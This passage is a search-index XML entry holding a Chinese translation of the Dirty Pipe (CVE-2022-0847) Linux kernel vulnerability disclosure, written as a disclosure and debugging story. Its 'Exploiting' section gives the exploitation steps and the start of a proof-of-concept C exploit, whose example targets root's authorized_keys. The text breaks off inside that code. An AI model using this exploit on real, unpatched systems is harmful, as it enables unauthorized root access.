<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>The Dirty Pipe Vulnerability[中文翻译]</title>
    <link href="/2022/03/15/The%20Dirty%20Pipe%20Vulnerability/"/>
    <url>/2022/03/15/The%20Dirty%20Pipe%20Vulnerability/</url>
    
    <content type="html"><![CDATA[<h1 id="The-Dirty-Pipe-Vulnerability"><a href="#The-Dirty-Pipe-Vulnerability" class="headerlink" title="The Dirty Pipe Vulnerability"></a>The Dirty Pipe Vulnerability</h1><p>原文：<a href="https://dirtypipe.cm4all.com/">The Dirty Pipe Vulnerability</a><br>作者：Max Kellermann <a href="mailto:&#109;&#97;&#x78;&#46;&#x6b;&#101;&#x6c;&#108;&#101;&#114;&#x6d;&#97;&#x6e;&#110;&#64;&#x69;&#111;&#110;&#111;&#x73;&#x2e;&#99;&#111;&#x6d;">&#109;&#97;&#x78;&#46;&#x6b;&#101;&#x6c;&#108;&#101;&#114;&#x6d;&#97;&#x6e;&#110;&#64;&#x69;&#111;&#110;&#111;&#x73;&#x2e;&#99;&#111;&#x6d;</a></p><h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>这是CVE-2022-0847的故事，自5.8版本以来，Linux内核中存在一个漏洞，允许覆盖任意只读文件中的数据。这会导致权限升级，因为非特权进程可以将代码注入根进程。<br>它类似于CVE-2016-5195“脏牛”，但更容易利用。<br>Linux 5.16.11、5.15.25和5.10.102中修复了该漏洞。</p><h1 id="损坏I"><a href="#损坏I" class="headerlink" title="损坏I"></a>损坏I</h1><p>这一切都始于一年前，当时有一张关于文件损坏的工单。一位客户抱怨他们下载的访问日志无法解压缩。事实上，其中一台日志服务器上有一个损坏的日志文件；它可以被解压缩，但gzip报告了一个CRC错误。我无法解释它为什么会损坏，但我认为每晚的split进程发生了crash，造成了文件的损坏。我手动修复了文件的CRC，关闭了工单，很快就忘记了这个问题。<br>几个月后，这种情况一再发生。每次文件的内容看起来都是正确的，只有文件末尾的CRC是错误的。现在有了几个损坏的文件，我能够深入挖掘，发现了一种令人惊讶的损坏问题。一种pattern浮现了出来。</p><h1 id="访问日志"><a href="#访问日志" class="headerlink" title="访问日志"></a>访问日志</h1><p>让我简单介绍一下日志服务器的工作原理：在CM4all托管环境中，所有web服务器（运行我们的自定义开源HTTP服务器）都会发送UDP多播数据报，其中包含关于每个HTTP请求的元数据。这些都是运行Pond的日志服务器接收的，Pond是我们定制的开源内存数据库。夜间作业将前一天的所有访问日志拆分(split)为每个托管网站的一个日志，每个日志都用zlib压缩。<br>通过HTTP，一个月的所有访问日志都可以作为一个单独的<code>.gz</code>文件下载。使用一个技巧（涉及到<code>Z_SYNC_FLUSH</code>），我们可以连接所有gzip每日日志文件，而不必解压和重新压缩它们，这意味着这个HTTP请求几乎不消耗CPU。通过使用<code>splice()</code>系统调用将数据直接从硬盘送到HTTP连接中，而不通过内核/用户空间边界（“零拷贝”），进而可以节省内存带宽。<br>Windows用户无法处理<code>.gz</code>文件，但每个人都可以解压缩ZIP文件。一个ZIP文件只是一个<code>.gz</code>文件的容器，因此我们可以使用相同的方法实时生成ZIP文件；我们需要做的就是先发送一个ZIP头，然后和往常一样连接所有<code>.gz</code>文件的内容，后面是中心目录（另一种头）。</p><h1 id="损坏II"><a href="#损坏II" class="headerlink" title="损坏II"></a>损坏II</h1><p>以下是一份正式的日常文件的结尾：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">000005f</span>0  <span class="hljs-number">81</span> d6 <span class="hljs-number">94</span> <span class="hljs-number">39</span> <span class="hljs-number">8</span>a <span class="hljs-number">05</span> b0 ed  e9 c0 fd <span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> ff ff<br><span class="hljs-number">00000600</span>  <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">9</span>c <span class="hljs-number">12</span> <span class="hljs-number">0b</span> f5 f7 <span class="hljs-number">4</span>a  <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p><code>00 00 ff ff</code>是允许简单连接的<a href="https://www.bolet.org/~pornin/deflate-flush-fr.html">sync flush</a>。<code>03 00</code>是一个<a href="https://datatracker.ietf.org/doc/html/rfc1951#page-9">空的“final”块</a>，后面跟一个CRC32（0xf50b129c）和未压缩文件长度（<code>0x00004af7</code>=19191字节）。<br>相同的文件，但已损坏的文件结尾：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">000005f</span>0  <span class="hljs-number">81</span> d6 <span class="hljs-number">94</span> <span class="hljs-number">39</span> <span class="hljs-number">8</span>a <span class="hljs-number">05</span> b0 ed  e9 c0 fd <span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> ff ff<br><span class="hljs-number">00000600</span>  <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">50</span> <span class="hljs-number">4b</span> <span class="hljs-number">01</span> <span class="hljs-number">02</span> <span class="hljs-number">1</span>e <span class="hljs-number">03</span>  <span class="hljs-number">14</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>sync flush在，empty final block在，但未压缩的长度现在是<code>0x0014031e</code>=1.3 MB（这是错误的，因为文件是与上面相同的19kB文件）。CRC32为<code>0x02014b50</code>，这与文件内容不匹配。为什么？这是日志客户端中的out-of-bounds write还是heap corruption的BUG？<br>我比较了所有已知的损坏文件，惊讶地发现它们都有相同的CRC32和相同的“文件长度”值。总是相同的CRC——这意味着这不能是CRC计算的结果。对于损坏的数据，我们会看到不同（但错误）的CRC值。我一直盯着代码上的漏洞，盯了几个小时但找不到解释。<br>然后我盯着这8个字节。最终，我意识到<code>50 4b</code>是代表“P”和“K”的ASCII码。“PK”，这就是所有ZIP标题的开头。让我们再看看这8个字节：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">50</span> <span class="hljs-number">4b</span> <span class="hljs-number">01</span> <span class="hljs-number">02</span> <span class="hljs-number">1</span>e <span class="hljs-number">03</span> <span class="hljs-number">14</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><ul><li><code>50 4b</code> is “PK”</li><li><code>0x02014b50</code> 是<a href="https://en.wikipedia.org/wiki/ZIP_(file_format)#Central_directory_file_header">中心目录的特征头</a></li><li>“Version made by” = <code>1e 03</code>; <code>0x1e</code> = 30 (3.0); <code>0x03</code> = UNIX</li><li>“Version needed to extract” = <code>14 00</code>; <code>0x0014</code> = 20 (2.0)<br>其余的中心目录文件头都不见了；很明显头文件在8字节后被截断。<br>这实际上是ZIP中央目录文件头的开始，这不能是巧合。但编写这些文件的进程中没有生成此类头文件的代码。在绝望中，我查看了zlib源代码和该过程使用的所有其他库，但什么也没找到。这个软件对“PK”头一无所知。<br>不过，有一个进程会生成“PK”头；web服务会实时构造ZIP文件。但这个进程以另一个用户的身份运行，该用户对这些文件没有写权限。不可能是这个进程。<br>所有这些都没有意义，但新的工单不断出现（速度非常慢）。可能存在系统上的问题，但我就是没找到。这让我很沮丧，但我忙于其他任务，我一直把这个文件损坏问题推到任务队列的后面。</li></ul><h1 id="损坏III"><a href="#损坏III" class="headerlink" title="损坏III"></a>损坏III</h1><p>外部压力使我重新意识到了这个问题。我扫描了整个硬盘，寻找损坏的文件（花了两天时间），希望出现更多的规律。事实上，有一种规律：</p><ul><li>在过去3个月内，共有37个损坏文件发生在22个独特的日期</li><li>其中18天发生1次损坏</li><li>1天发生2次损坏（2021-11-21）</li><li>1天发生7次损坏（2021-11-30）</li><li>1天发生6次损坏（2021-12-31）</li><li>1天发生4次损坏（2022-01-31）<br>每个月的最后一天显然是发生文件损坏最多的一天。<br>只有主日志服务器有损坏（提供HTTP连接和构造ZIP文件的服务器）。备用服务器（HTTP非活动，但日志提取过程相同）没有损坏文件。两台服务器上的数据都是相同的，除了那些损坏的文件。<br>这是由脆弱的硬件造成的吗？损坏的RAM？糟糕的存储？宇宙射线？不，这些症状看起来不像是硬件问题。机器里有鬼？我们需要驱魔师吗？</li></ul><h1 id="盯着代码"><a href="#盯着代码" class="headerlink" title="盯着代码"></a>盯着代码</h1><p>我又开始盯着代码上的漏洞，这次是web服务。<br>请记住，web服务会写入一个ZIP头，然后使用<code>splice()</code>发送所有压缩文件，最后再次使用<code>write()</code>发送“中心目录文件头”，该文件头以<code>50 4b 01 02 1e 03 14 00</code>开头，这正是损坏的位置。通过数据流发送的数据看起来与磁盘上的损坏文件一模一样。但是通过网络发送的进程对这些文件没有写权限（甚至没有尝试这样做），它只读取它们。不管遇到什么困难和不可能的事情，<strong>一定</strong>是这个进程导致了文件损坏，但如何导致文件损坏呢？<br>我的第一个灵感闪现，为什么总是在一个月的最后一天损坏。当网站所有者下载访问日志时，服务器从每月的第一天开始，然后是第二天，依此类推。当然，一个月的最后一天是在月底发送的；一个月的最后一天总是跟在“PK”标题后面。这就是为什么它更有可能在最后一天损坏。（如果请求的月份尚未结束，其他日子也可能会发送文件损坏问题，但这种可能性较小。）<br>所以如何导致文件损坏的？</p><h1 id="盯着内核代码"><a href="#盯着内核代码" class="headerlink" title="盯着内核代码"></a>盯着内核代码</h1><p>在这里被困了几个小时之后，且消除了所有绝对不可能的事情之后（在我看来），我得出了一个结论：这一定是一个内核错误。<br>将数据损坏归咎于Linux内核（即其他人的代码）必须是最后的手段。这不太可能。内核是一个极其复杂的项目，由成千上万的人用看似混乱的方法开发；尽管如此，它还是非常稳定和可靠的。但这一次，我确信这一定是一个内核错误。<br>在一个非常清晰的时刻，我破解了两个C程序。<br>一个程序持续将字符串“AAAAA”的奇数块写入文件（模拟日志拆分器）：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span> </span>&#123;<br>  <span class="hljs-keyword">for</span> (;;) <span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;AAAAA&quot;</span>, <span class="hljs-number">5</span>);<br>&#125;<br><span class="hljs-comment">// ./writer &gt;foo</span><br></code></pre></td></tr></table></figure><p>另一个使用<code>splice()</code>将数据从该文件传输到管道，然后将字符串“BBBBB”写入管道（模拟ZIP生成器）：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span> </span>&#123;<br>  <span class="hljs-keyword">for</span> (;;) &#123;<br>    <span class="hljs-built_in">splice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;BBBBB&quot;</span>, <span class="hljs-number">5</span>);<br>  &#125;<br>&#125;<br><span class="hljs-comment">// ./splicer &lt;foo |cat &gt;/dev/null</span><br></code></pre></td></tr></table></figure><p>我把这两个程序复制到了日志服务器上，然后…<strong>Bingo</strong>！字符串“BBBBB”开始出现在文件中，尽管从未有人将此字符串写入文件（仅通过没有写入权限的进程写入管道）。<br>所以这真的是一个内核错误！<br>一旦BUG被复现，问题就会变得很清晰。通过快速检查，验证了该漏洞影响的是Linux 5.10（Debian Bullseye），而不是Linux 4.19（Debian Buster）。v4.19和v5.10之间有185.011个git commit，但多亏了<code>git bisect</code>，只需17个步骤就可以找到错误的commit 。<br>当<code>bisect</code>到达commit <a href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">f6dd975583bd</a>，它为匿名管道缓冲区重构了管道缓冲区代码。它改变了管道““mergeable””检查的方式。</p><blockquote><p>之前是定义为函数的形式，然后现在定义了一个变量</p></blockquote><h1 id="管道、缓冲区和页面"><a href="#管道、缓冲区和页面" class="headerlink" title="管道、缓冲区和页面"></a>管道、缓冲区和页面</h1><p>为什么是管道？在我们的设置中，生成ZIP文件的web服务通过管道与web服务器通信；它使用了我们开源的<a href="https://github.com/CM4all/libwas/">Web应用程序套接字协议</a>，因为我们对CGI、FastCGI和AJP不满意。使用管道而不是通过套接字进行多路复用（如FastCGI和AJP所做的）有一个主要优势：可以在应用程序和web服务器中使用<code>splice()</code>，以获得最大效率。这减少了在进程外的web应用程序的开销（而不是像Apache模块那样在web服务器进程内运行web服务）。这允许在不牺牲（很多）性能的情况下分离权限。<br><a href="https://www.kernel.org/doc/html/latest/admin-guide/mm/concepts.html">Linux内存管理</a>的简短介绍：CPU管理的最小内存单元是一个<strong>Page</strong>（通常为4KB）。在Linux的内存管理层中，最底层的都是和Page相关。如果应用程序从内核请求内存，它将获得大量（匿名）Pages。所有文件I/O也都与Pages有关：如果从文件中读取数据，内核首先将大量4KB的数据块从硬盘复制到内核内存中，由一个名为<strong>Page cache</strong>(页面缓存)的子系统管理。从那里，数据将被复制到用户空间。Page cache中的副本会保留一段时间，以便再次使用，从而避免不必要的硬盘I/O，直到内核决定更好地使用该内存（回收）。使用<code>mmap()</code>系统调用将Page cache管理的Page直接映射到用户空间，而不需要将文件数据复制到用户空间内存去（以增加页面错误和TLB刷新为代价降低内存带宽的折衷方案）。Linux内核有更多的trick：<code>sendfile()</code>系统调用允许应用程序将文件内容发送到socket，而无需往返到用户空间（这是一种在通过HTTP提供静态文件的web服务器中比较流行的优化措施）。<code>splice()</code>系统调用是<code>sendfile()</code>的一种泛化：它允许进行相同的优化；传输的任一侧是管道，另一侧几乎可以是任何东西（另一个管道、一个文件、一个套接字、一个块设备、一个字符设备）。内核通过传递<strong>Page</strong> 引用(references)来实现这一点，而不是实际复制任何内容（零拷贝）。<br><strong>管道</strong>是单向进程间通信的工具。一端push数据，另一端pull数据。Linux内核通过一个<a href="https://github.com/torvalds/linux/blob/v5.8/include/linux/pipe_fs_i.h#L26-L32">struct pipe_buffer</a>的<a href="https://github.com/torvalds/linux/blob/v5.8/include/linux/pipe_fs_i.h#L76">ring</a>来实现这一点，每个pipe_buffer都指向一个<strong>Page</strong>。对管道的第一次写入会分配一个Page（可容纳4KB数据的空间）。如果最近一次写入没有完全填满页面，则后续写入可能会附加到该现有页面，而不是分配新页面。这就是“匿名”管道缓冲区的工作原理（<a href="https://github.com/torvalds/linux/blob/v5.8/fs/pipe.c#L217-L221">anon_pipe_buf_ops</a>）。<br>但是，如果将<code>splice()</code>数据从文件拼接到管道中，内核将首先将数据加载到<strong>Page cache</strong>中。然后，它将创建一个指向page cache内部的<code>struct pipe_buffer</code> 的指针（零拷贝），但与匿名管道缓冲区不同，写入管道的附加数据不能附加到这样的Page上，因为Page由Page cache而不是管道拥有。<br>检查是否有可以将新数据附加到现有管道缓冲区的代码历史记录：</p><ul><li>很久之前， <code>struct pipe_buf_operations</code> 有一个flag为<code>can_merge</code>.</li><li><a href="https://github.com/torvalds/linux/commit/5274f052e7b3dbd81935772eb551dfd0325dfa9d">Commit 5274f052e7b3 “Introduce sys_splice() system call” (Linux 2.6.16, 2006)</a> 。以<code>splice()系统</code>调用为特色，引入了<code>page_cache_pipe_buf_ops</code>，这是一个<code>struct pipe_buf_operations</code>实现，用于指向page cache的管道缓冲区，第一个是<code>can_merge=0</code>（不可合并）。</li><li><a href="https://github.com/torvalds/linux/commit/01e7187b41191376cee8bea8de9f907b001e87b4">https://github.com/torvalds/linux/commit/01e7187b41191376cee8bea8de9f907b001e87b4</a> 将can_merge的flag转换为和 <code>struct pipe_buf_operations</code>指针比较，因为只有一个<code>anon_pipe_buf_ops</code> 可以设置了此标志。</li><li><a href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">Commit f6dd975583bd “pipe: merge anon_pipe_buf*_ops” (Linux 5.8, 2020)</a>  将此指针比较的方式转换为每个缓冲区的flag<code>PIPE_BUF_FLAG_CAN_MERGE</code>.<br>这些年来，这个check被反复重构，哪一个是对的？或者他是什么？</li></ul><h1 id="未初始化"><a href="#未初始化" class="headerlink" title="未初始化"></a>未初始化</h1><p>在<code>PIPE_BUF_FLAG_CAN_MERGE</code>诞生的几年前，<a href="https://github.com/torvalds/linux/commit/241699cd72a8489c9446ae3910ddd243e9b9061b">commit 241699cd72a8 “new iov_iter flavour: pipe-backed” (Linux 4.9, 2016)</a>添加了两个新函数，它们分配了一个新的<code>struct pipe_buffer</code>，但缺少对其flags成员的初始化。现在可以使用任意flags创建Page cache的引用，但这并不重要。从技术上讲，这是一个bug，尽管当时没有任何后果，因为所有现有的flag都无法使用。<br>在Linux5.8中，这个bug突然变得非常严重，因为它使用了<a href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">commit f6dd975583bd“pipe:merge anon_pipe_buf*_ops”</a>。通过将<code>PIPE_BUF_FLAG_CAN_MERGE</code>注入Page cache引用，使得只需将新数据写入以特殊方式准备的管道，就可以覆盖Page cache中的数据。</p><h1 id="损坏IV"><a href="#损坏IV" class="headerlink" title="损坏IV"></a>损坏IV</h1><p>这就解释了文件损坏的原因：首先，一些数据被写入管道，然后大量文件被拼接，并且创建Page cache引用。这些引用随机的，可能有或可能没有设置<code>PIPE_BUF_FLAG_CAN_MERGE</code> 。如果有，那么写入中央目录文件头的<code>write()</code>调用将被写入到最后一个压缩文件的Page cache中。<br>但为什么只有头8个字节？实际上，所有的头都会被复制到页面缓存中，但这个操作不会增加文件大小。原始文件末尾只有8个字节的“未拼接”空间，只有这些字节可以被覆盖。从page cache的角度来看，这一个page的其余部分是未使用的（尽管管道缓冲区代码确实使用它，因为它有自己的页面填充管理）。<br>为什么这种情况不经常发生？因为页面缓存不会写回磁盘，除非它认为页面是“脏”的。意外覆盖页面缓存中的数据不会使页面“脏”。如果没有其他进程“弄脏”文件，则此更改将是短暂的；在下一次重新启动后（或者在内核决定从缓存中删除页面后，比如在内存压力下回收页面），更改将被恢复。这使得有趣的攻击不会在硬盘上留下痕迹。</p><h1 id="Exploiting"><a href="#Exploiting" class="headerlink" title="Exploiting"></a>Exploiting</h1><p>在我的第一个EXP中（我用于bisect的“writer”/“splicer”程序），我假设只有在特权进程写入文件时，才能利用这个漏洞，并且它取决于时间。<br>当我意识到真正的问题是什么时，我能够将漏洞扩大很大一部分：即使在没有写入权限的情况下，也有可能覆盖page cache，而不受时间限制，在(几乎)任意位置的任意数据上。这些限制是：</p><ul><li>攻击者必须具有读取权限（因为它需要将<code>splice()</code> 一个page到一个管道中）。</li><li>偏移量不得位于页面边界上（因为该页的至少一个字节必须拼接到管道中）。</li><li>写入不能跨越页面边界（因为将为剩余部分创建新的匿名缓冲区）。</li><li>无法调整文件大小（因为管道有自己的页面填充管理，并且不会告诉page cache添加了多少数据）<br>要利用此漏洞，您需要：</li></ul><ol><li>创建一个管道。</li><li>用任意数据填充管道（在所有环入口中设置<code>PIPE_BUF_FLAG_CAN_MERGEE</code>flag）。</li><li>排空管道（在<code>struct pipe_inode_info</code>环上的所有<code>struct pipe_buffer</code>实例中保留设置的flag）。</li><li>将目标文件（仅用<code>O_RDONLY</code>打开）中的数据从目标偏移之前拼接到管道中。</li><li>将任意数据写入管道；此数据将覆盖缓存的文件页，而不是创建新的匿名<code>struct pipe_buffer</code>，因为设置了<code>PIPE_BUF_FLAG_CAN_MERGE</code> 的flag<br>为了使此漏洞更有趣，它不仅可以在没有写权限的情况下工作，还可以在不可修改文件、只读btrfs快照和只读挂载（包括CD-ROM挂载）上工作。这是因为页面缓存始终是可写的（由内核），而写入管道永远不会检查任何权限。<br>这是我的概念证明：<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* SPDX-License-Identifier: GPL-2.0 */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Copyright 2022 CM4all GmbH / IONOS SE</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * author: Max Kellermann &lt;max.kellermann@ionos.com&gt;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Proof-of-concept exploit for the Dirty Pipe</span><br><span class="hljs-comment"> * vulnerability (CVE-2022-0847) caused by an uninitialized</span><br><span class="hljs-comment"> * &quot;pipe_buffer.flags&quot; variable.  It demonstrates how to overwrite any</span><br><span class="hljs-comment"> * file contents in the page cache, even if the file is not permitted</span><br><span class="hljs-comment"> * to be written, immutable or on a read-only mount.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This exploit requires Linux 5.8 or later; the code path was made</span><br><span class="hljs-comment"> * reachable by commit f6dd975583bd (&quot;pipe: merge</span><br><span class="hljs-comment"> * anon_pipe_buf*_ops&quot;).  The commit did not introduce the bug, it was</span><br><span class="hljs-comment"> * there before, it just provided an easy way to exploit it.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * There are two major limitations of this exploit: the offset cannot</span><br><span class="hljs-comment"> * be on a page boundary (it needs to write one byte before the offset</span><br><span class="hljs-comment"> * to add a reference to this page to the pipe), and the write cannot</span><br><span class="hljs-comment"> * cross a page boundary.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Example: ./write_anything /root/.ssh/authorized_keys 1 $&#x27;\nssh-ed25519 AAA......\n&#x27;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Further explanation: https://dirtypipe.cm4all.com/</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/user.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> PAGE_SIZE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PAGE_SIZE 4096</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span><br><span class="hljs-comment"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">prepare_pipe</span><span class="hljs-params">(<span class="hljs-keyword">int</span> p[<span class="hljs-number">2</span>])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">pipe</span>(p)) <span class="hljs-built_in">abort</span>();<br><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> pipe_size = <span class="hljs-built_in">fcntl</span>(p[<span class="hljs-number">1</span>], F_GETPIPE_SZ);<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">4096</span>];<br><br><span class="hljs-comment">/* fill the pipe completely; each pipe_buffer will now have</span><br><span class="hljs-comment">   the PIPE_BUF_FLAG_CAN_MERGE flag */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">unsigned</span> r = pipe_size; r &gt; <span class="hljs-number">0</span>;) &#123;<br><span class="hljs-keyword">unsigned</span> n = r &gt; <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buffer) ? <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buffer) : r;<br><span class="hljs-built_in">write</span>(p[<span class="hljs-number">1</span>], buffer, n);<br>r -= n;<br>&#125;<br><br><span class="hljs-comment">/* drain the pipe, freeing all pipe_buffer instances (but</span><br><span class="hljs-comment">   leaving the flags initialized) */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">unsigned</span> r = pipe_size; r &gt; <span class="hljs-number">0</span>;) &#123;<br><span class="hljs-keyword">unsigned</span> n = r &gt; <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buffer) ? <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buffer) : r;<br><span class="hljs-built_in">read</span>(p[<span class="hljs-number">0</span>], buffer, n);<br>r -= n;<br>&#125;<br><br><span class="hljs-comment">/* the pipe is now empty, and if somebody adds a new</span><br><span class="hljs-comment">   pipe_buffer without initializing its &quot;flags&quot;, the buffer</span><br><span class="hljs-comment">   will be mergeable */</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span 